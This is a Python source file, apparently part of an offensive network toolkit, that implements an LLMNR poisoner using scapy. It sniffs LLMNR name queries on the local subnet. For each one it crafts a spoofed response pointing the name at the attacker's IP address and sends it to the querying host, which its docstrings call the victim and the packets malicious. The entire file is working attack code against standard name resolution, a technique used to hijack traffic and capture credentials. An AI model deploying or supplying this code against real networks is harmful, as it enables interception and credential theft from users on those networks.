#!/usr/bin/env python3
from typing import List, Tuple, Type
import binascii
from scapy.all import (
    DNSRR,
    Ether,
    IP,
    UDP,
    sendp,
    sniff,
    packet,
    IPv6,
    DNS,
    LLMNRResponse,
    LLMNRQuery,
)
from .poisonnetwork import PoisonNetwork
import time
from loguru import logger
from threading import Thread
from colorama import Fore, Style


class LLMNR(PoisonNetwork):
    """[ LLMNR poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        ipv6: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        level: str = "INFO",
    ):
        super().__init__(ip, ipv6, mac_address, iface, info_logger, level)

    def __transport_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add transport layer to the response packet ]

        Args:
            response (packet): [ Packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """
        response /= UDP(sport=5355, dport=pkt[UDP].sport)
        return response

    def __dns_resource_record(self, pkt: packet) -> DNSRR:
        """[ Function to configure dns record for the response ]

        Args:
            pkt (packet): [ sniffed package ]

        Returns:
            DNSRR: [ DNS record ]
        """
        return DNSRR(
            rrname=pkt[LLMNRQuery].qd.qname,
            type="A",
            rclass="IN",
            ttl=120,
            rdlen=None,
            rdata=self.ip,
        )

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add application layer to the response packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
            response (packet): [ packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """

        response /= LLMNRResponse(
            id=pkt[LLMNRQuery].id,
            qr=1,
            opcode="QUERY",
            c=0,
            tc=0,
            z=0,
            rcode="ok",
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=pkt[LLMNRQuery].qd,
            an=self.__dns_resource_record(pkt),
            ns=None,
            ar=None,
        )
        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.info_logger.debug("Packet crafted: ")
        self.info_logger.debug(response.summary())
        if ip_of_the_packet not in self.targets_used:
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(LLMNR) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )
            sendp(response, verbose=False)
            self.targets_used.append(ip_of_the_packet)

    def __filter_for_llmnr(self, pkt: packet) -> bool:
        """[ Filter by sniffed packets of interest ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            bool: [ If the packet is asking for a resource ]
        """
        return (
            pkt.haslayer(LLMNRQuery)
            and (
                (pkt.haslayer(IP) and pkt[IP].dst == "224.0.0.252")
                or (pkt.haslayer(IPv6) and pkt[IPv6].dst == "ff02::1:3")
            )
            and pkt[LLMNRQuery].qd is not None
        )

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if self.__filter_for_llmnr(pkt):
            response = self._data_link_layer(pkt)
            response, ip_of_the_packet = self._network_layer(pkt, response)
            response = self.__transport_layer(pkt, response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_llmnr_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.info_logger.log(self.logger_level, "Starting llmnr poisoning...")
        self._start_cleaner()
        sniff(
            filter="udp and port 5355",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )
